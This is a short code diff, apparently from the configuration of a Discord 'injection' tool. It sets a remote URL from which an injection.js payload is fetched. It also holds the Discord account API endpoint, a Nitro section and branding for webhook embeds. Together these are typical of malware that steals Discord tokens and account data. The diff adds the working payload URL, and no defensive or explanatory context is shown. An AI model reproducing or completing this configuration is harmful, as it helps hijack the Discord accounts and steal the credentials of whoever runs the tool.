@@ -13,7 +13,7 @@ const config = {
   embed_name: 'NN Discord İnjection 🦖', 
   embed_icon: 'https://files.catbox.moe/hwyy5k.jpg', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent', 
+  injection_url: 'https://raw.githubusercontent.com/DomaditoJijo/pe_to_shellcode/refs/heads/master/loader_v2/injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
